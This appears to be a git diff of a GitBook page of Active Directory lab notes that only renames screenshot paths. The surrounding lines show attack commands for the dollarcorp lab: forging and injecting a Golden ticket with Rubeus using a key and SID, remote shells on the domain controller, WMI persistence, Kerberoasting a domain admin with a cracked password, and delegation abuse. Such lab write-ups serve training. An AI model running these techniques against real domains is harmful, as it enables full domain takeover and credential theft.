@@ -30,11 +30,11 @@ C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-g
 
 > In us vm student console/machine
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt="" width="509"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1).png" alt="" width="509"><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now, It generete us a complete command to forge a Golden ticket.
 
@@ -59,13 +59,13 @@ Once the ticket is injected, we can access resources in the domain:
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:3046 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
 ```
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 winrs -r:dcorp-dc cmd
 ```
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -184,7 +184,7 @@ winrs -r:dcorp-dc cmd
 set username
 ```
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -211,7 +211,7 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
 
 #### Check It
 
@@ -285,7 +285,7 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Get-DomainUser -SPN
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 The `svcadmin`, which is a domain administrator has a SPN set! Let’s Kerberoast it!
 
@@ -348,7 +348,7 @@ We can now use John the Ripper to brute-force the hashes.
 >
 > in hashes.txt
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Run the below command after making above changes:
 
@@ -367,7 +367,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 `svcadmin:*ThisisBlasphemyThisisMadness!!`
 
@@ -385,7 +385,7 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Get-DomainComputer -Unconstrained | select -ExpandProperty name
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv.&#x20;
 
@@ -444,7 +444,7 @@ C:\Users\appadmin> netsh interface portproxy add v4tov4 listenport=8080 listenad
 >
 > > Remember upload too the Rubeus to us webserver
 > >
-> > ![](<../../.gitbook/assets/image (5).png>)
+> > ![](<../../.gitbook/assets/image (5) (1).png>)
 
 Execute Rubeus
 
@@ -510,7 +510,7 @@ After execute some of these options, on the Rubeus listener (dcorp-appsrv), we c
 [snip]
 ```
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="background-color:yellow;">Copy the base64 encoded ticket and use it with Rubeus on student VM.</mark>&#x20;
 
